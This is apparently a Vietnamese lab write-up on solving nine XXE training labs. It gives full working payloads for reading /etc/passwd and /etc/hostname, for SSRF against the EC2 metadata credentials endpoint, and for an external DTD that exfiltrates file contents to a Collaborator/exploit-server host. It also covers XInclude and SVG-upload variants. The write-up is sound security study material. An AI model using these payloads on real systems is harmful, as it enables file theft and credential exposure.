# Lab 1: Exploiting XXE using external entities to retrieve files
![image](https://hackmd.io/_uploads/r1d8ee1QA.png)

Cú pháp external entities: `<!ENTITY entity_name SYSTEM "entity_value">`
Khai thác bằng cách:
- Thêm phần tử DOCTYPE định nghĩa external entities chứa path của file.
- Sửa giá trị dữ liệu trong XML để trả về external entities vừa thêm

![image](https://hackmd.io/_uploads/SyonMe1X0.png)

![image](https://hackmd.io/_uploads/ryf0fgJXR.png)

# Lab 2: Exploiting XXE to perform SSRF attacks
![image](https://hackmd.io/_uploads/Hyb2Nx17R.png)

Tương tự bài trên, SSRF bằng cách định nghĩa một external entity `&xxe;` mà giá trị của nó là nội dung server có địa chỉ `http://169.254.169.254/` trả về khi GET đến và sử dụng entity `&xxe;` tại trường `productId`
![image](https://hackmd.io/_uploads/SkISClyQ0.png)

Server trả về thông tin chứa đường dẫn của EC2 metadata. Làm tương tự với các thư mục con tiếp theo, ta thu được:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```
![image](https://hackmd.io/_uploads/Sy8aRxJQA.png)

![image](https://hackmd.io/_uploads/HkvRAgyQC.png)

# Lab 3: Blind XXE with out-of-band interaction
![image](https://hackmd.io/_uploads/rkQ43VlmC.png)

Tương tự lab trước, nhưng chỉ trả về 1 thông báo
![image](https://hackmd.io/_uploads/rJdaaVxQC.png)

Sử dụng Burp Collaborator để nhận HTTP request
![image](https://hackmd.io/_uploads/HyKwaNxXC.png)

Có được DNS lookup và HTTP request
![image](https://hackmd.io/_uploads/By686VlQC.png)

![image](https://hackmd.io/_uploads/SyJIaVx70.png)

# Lab 4: Blind XXE with out-of-band interaction via XML parameter entities
![image](https://hackmd.io/_uploads/rJesgBlQA.png)

Ở bài này server đã block các thực thể thông thường
![image](https://hackmd.io/_uploads/ByIT-Bx7R.png)

Sử dụng XML parameter entities để bypass. Thay thế `&` bằng `%` - sử dụng trong DTD để khai báo và tham chiếu đến các thực thể trong DTD
**Chú ý: `%` chỉ được sử dụng trong DTD**
![image](https://hackmd.io/_uploads/r1kKESgXA.png)

![image](https://hackmd.io/_uploads/rkFt4Sg7A.png)

![image](https://hackmd.io/_uploads/ryxqNrxXA.png)

# Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
![image](https://hackmd.io/_uploads/ry9ODrlmC.png)
Lab này yêu cầu đọc nội dung file `/etc/hostname`

Lab này cũng block entity như lab 4
![image](https://hackmd.io/_uploads/rkdeiHgmC.png)

Bypass tương tự
![image](https://hackmd.io/_uploads/HkmfsHeXC.png)
![image](https://hackmd.io/_uploads/SJWQjHgXR.png)

Để đọc được file thì thực hiện như sau:
#### 1. Tải lên 1 DTD độc hại lên server
Định nghĩa một parameter entity `file` chứa nội dung tệp `/etc/hostname`
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
```
Định nghĩa một entity `eval` chứa parameter entity `exfiltrate` truy cập tới Burp Collaborator và gửi tham số `x` với tham chiếu `%file;`
```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://rql45k44aqih09lfyw1nl8wv9mfh37rw.oastify.com/?x=%file;'>">
```
`&#x25;` là HTML encode của `%` vì chứa trong một định nghĩa parameter entity khác.

File DTD cuối cùng như sau:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://rql45k44aqih09lfyw1nl8wv9mfh37rw.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Vì parameter entity cần được gọi tham chiếu mới có thể hoạt động nên cần thêm `%eval;`, `%exfiltrate;`

Tải lên server
![image](https://hackmd.io/_uploads/SJMaMLgQ0.png)

#### 2. Định nghĩa 1 parameter entities khiến server gọi đến DTD vừa tải lên
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab10043042794f6805c3ee4013d001d.exploit-server.net/exploit.dtd"> %xxe;]>
```
![image](https://hackmd.io/_uploads/Hy3wXUgQA.png)
![image](https://hackmd.io/_uploads/SyPFmLxmA.png)

# Lab 6: Exploiting blind XXE to retrieve data via error messages
![image](https://hackmd.io/_uploads/rJfXIUeX0.png)

Tương tự lab trên.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Khi server truy cập đến file `/nonexistent/etc/passwd` thì phát hiện không tồn tại và trả về lỗi chứa nội dung file `/etc/passwd`
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5600d603c83d8085fb438601b600dd.exploit-server.net/exploit.dtd"> %xxe;]>
```
![image](https://hackmd.io/_uploads/SJOiP8xXA.png)
![image](https://hackmd.io/_uploads/rk-2wUlmR.png)

# Lab 7: Exploiting XXE to retrieve data by repurposing a local DTD
![image](https://hackmd.io/_uploads/BJdOlDxQR.png)

DNS lookup thành công , chứng tỏ có lỗ hổng Blind XXE
![image](https://hackmd.io/_uploads/H1OkyYeQ0.png)
![image](https://hackmd.io/_uploads/HyZeyYe7R.png)

Lab này đã không cho phép truy cập tới external DTD nên ta sẽ dùng local DTD. Đề cho sẵn DTD tại `/usr/share/yelp/dtd/docbookx.dtd`

Nếu đường dẫn đúng, hệ thống sẽ trả về kết quả
![image](https://hackmd.io/_uploads/rkJLetgX0.png)

Nếu sai trả về lỗi
![image](https://hackmd.io/_uploads/HyZqgFl7A.png)

Payload
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Trong đó:
- `local_dtd` chứa nội dung file local DTD `/usr/share/yelp/dtd/docbookx.dtd` là local DTD
- `ISOamso` chứa định nghĩa: `file` chứa nội dung file `/etc/passwd`, `eval` chứa định nghĩa parameter entity `error` chứa nội dung `/etc/passwd` sau khi tham chiếu tới `%file;`
- Gọi tham chiếu các entity.

![image](https://hackmd.io/_uploads/B1C0btlmR.png)
![image](https://hackmd.io/_uploads/BkMzfYxQA.png)

# Lab 8: Exploiting XInclude to retrieve files
![image](https://hackmd.io/_uploads/B1MwVKxmC.png)

Lab này không chứa XML nên ta không để định nghĩa hay sửa lại phần tử DOCTYPE. Dùng XInclude để thay thế.
![image](https://hackmd.io/_uploads/r1HsHFeXR.png)

Để tấn công XInclude, tham chiếu XInclude namespace và cung cấp đường dẫn đến file cần đọc
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
![image](https://hackmd.io/_uploads/S1n6SFeQA.png)
![image](https://hackmd.io/_uploads/SkT0SFlQA.png)

# Lab 9: Exploiting XXE via image file upload 
![image](https://hackmd.io/_uploads/S13aPFlQ0.png)
Lab này chứa lỗ hổng XXE trong chức năng upload ảnh ở phần comment

Vì thư viện xử lí ảnh `png, jpg` có hỗ trợ xử lí file `svg` nên ta có thể upload một file `.svg` có chứa XML payload.
Payload kiếm được ở PayloadsAllTheThings:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload ảnh chứa payload này
![image](https://hackmd.io/_uploads/rJzxcFxQA.png)

![image](https://hackmd.io/_uploads/ryJ1ctxXA.png)
![image](https://hackmd.io/_uploads/ryjLcYlmR.png)

Cuối cùng là submit
![image](https://hackmd.io/_uploads/BJ_d5FlQC.png)
